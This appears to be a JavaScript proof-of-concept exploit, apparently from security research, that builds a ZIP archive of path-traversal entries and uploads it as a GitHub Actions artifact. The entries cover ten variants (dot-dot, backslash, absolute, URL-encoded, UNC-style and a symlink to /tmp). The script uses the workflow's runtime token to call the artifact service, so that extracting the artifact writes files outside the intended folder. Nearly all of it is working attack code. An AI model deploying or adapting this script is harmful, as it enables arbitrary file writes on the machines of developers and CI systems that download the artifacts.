const T=(()=>{const t=[];for(let n=0;n<256;n++){let c=n;for(let k=0;k<8;k++)c=(c&1)?(0xEDB88320^(c>>>1)):(c>>>1);t[n]=c>>>0;}return t;})();
function crc32(b){let c=0xFFFFFFFF;for(let i=0;i<b.length;i++)c=T[(c^b[i])&0xFF]^(c>>>8);return (c^0xFFFFFFFF)>>>0;}
// entries: {name, data, symlink?:true}
function zipStored(entries){
  const locals=[],central=[];let offset=0;
  for(const e of entries){
    const name=Buffer.from(e.name,'utf8'),data=Buffer.from(e.data,'utf8'),crc=crc32(data);
    const lh=Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50,0);lh.writeUInt16LE(20,4);lh.writeUInt16LE(0,6);
    lh.writeUInt16LE(0,8);lh.writeUInt16LE(0,10);lh.writeUInt16LE(0,12);
    lh.writeUInt32LE(crc,14);lh.writeUInt32LE(data.length,18);lh.writeUInt32LE(data.length,22);
    lh.writeUInt16LE(name.length,26);lh.writeUInt16LE(0,28);
    locals.push(lh,name,data);
    const ch=Buffer.alloc(46);
    // version made by: UNIX (3) << 8 | 30  -> external attrs read as st_mode
    ch.writeUInt32LE(0x02014b50,0);ch.writeUInt16LE(0x031E,4);ch.writeUInt16LE(20,6);
    ch.writeUInt16LE(0,8);ch.writeUInt16LE(0,10);ch.writeUInt16LE(0,12);ch.writeUInt16LE(0,14);
    ch.writeUInt32LE(crc,16);ch.writeUInt32LE(data.length,20);ch.writeUInt32LE(data.length,24);
    ch.writeUInt16LE(name.length,28);ch.writeUInt16LE(0,30);ch.writeUInt16LE(0,32);
    ch.writeUInt16LE(0,34);ch.writeUInt16LE(0,36);
    const mode = e.symlink ? 0xA1FF0000 : 0x81A40000;   // S_IFLNK 0777 : S_IFREG 0644
    ch.writeUInt32LE(mode>>>0,38);ch.writeUInt32LE(offset,42);
    central.push(ch,name);
    offset+=30+name.length+data.length;
  }
  const lo=Buffer.concat(locals),cd=Buffer.concat(central);
  const eo=Buffer.alloc(22);
  eo.writeUInt32LE(0x06054b50,0);eo.writeUInt16LE(0,4);eo.writeUInt16LE(0,6);
  eo.writeUInt16LE(entries.length,8);eo.writeUInt16LE(entries.length,10);
  eo.writeUInt32LE(cd.length,12);eo.writeUInt32LE(lo.length,16);eo.writeUInt16LE(0,20);
  return Buffer.concat([lo,cd,eo]);
}
(async()=>{
  const tok=process.env.ACTIONS_RUNTIME_TOKEN, base=process.env.ACTIONS_RESULTS_URL;
  const claims=JSON.parse(Buffer.from(tok.split('.')[1],'base64').toString());
  const scp=Array.isArray(claims.scp)?claims.scp.join(' '):String(claims.scp);
  const m=/Actions\.Results:([0-9a-f-]+):([0-9a-f-]+)/i.exec(scp);
  const runId=m[1], jobId=m[2];
  const U="../../../../../../../../";
  const entries=[
    {name:"benign.txt",                      data:"ordinary output\n"},
    {name:U+"tmp/V01_plain",                 data:"V01 plain ../\n"},
    {name:"..\..\..\..\..\..\..\..\tmp\V02_backslash", data:"V02 backslash\n"},
    {name:"/tmp/V03_absolute",               data:"V03 absolute\n"},
    {name:"....//....//....//....//....//....//....//....//tmp/V04_doubled", data:"V04 doubled\n"},
    {name:"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fV05_urlenc", data:"V05 urlencoded\n"},
    {name:"sub/"+U+"tmp/V06_prefixed",       data:"V06 prefixed\n"},
    {name:"./"+U+"tmp/V07_dotslash",         data:"V07 dot-slash\n"},
    {name:U.repeat(2)+"tmp/V08_deep",        data:"V08 deep\n"},
    {name:"\\?\C:\tmp\V09_unc",         data:"V09 unc\n"},
    {name:"link", symlink:true,              data:"/tmp"},
    {name:"link/V10_symlink",                data:"V10 via symlink\n"},
  ];
  const zip=zipStored(entries);
  console.log("variants:",entries.length,"zip bytes:",zip.length);
  entries.forEach(e=>console.log("   entry:",JSON.stringify(e.name),e.symlink?"(SYMLINK)":""));
  const svc=base.replace(/\/$/,'')+"/twirp/github.actions.results.api.v1.ArtifactService/";
  const hdrs={"Content-Type":"application/json","Authorization":"Bearer "+tok};
  let r=await fetch(svc+"CreateArtifact",{method:"POST",headers:hdrs,body:JSON.stringify(
    {workflow_run_backend_id:runId,workflow_job_run_backend_id:jobId,name:"poc",version:4})});
  const c=await r.json(); console.log("CreateArtifact:",r.status,c.ok);
  const bid=Buffer.from("block0").toString("base64");
  console.log("block:",(await fetch(c.signed_upload_url+"&comp=block&blockid="+bid,
    {method:"PUT",headers:{"x-ms-blob-type":"BlockBlob"},body:zip})).status);
  console.log("commit:",(await fetch(c.signed_upload_url+"&comp=blocklist",{method:"PUT",
    headers:{"Content-Type":"application/xml"},
    body:'<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>'+bid+'</Latest></BlockList>'})).status);
  const sha=require('crypto').createHash('sha256').update(zip).digest('hex');
  r=await fetch(svc+"FinalizeArtifact",{method:"POST",headers:hdrs,body:JSON.stringify(
    {workflow_run_backend_id:runId,workflow_job_run_backend_id:jobId,name:"poc",
     size:zip.length,hash:"sha256:"+sha})});
  console.log("Finalize:",r.status,(await r.text()).slice(0,120));
})().catch(e=>{console.log("EXPLOIT ERROR:",e.message);});
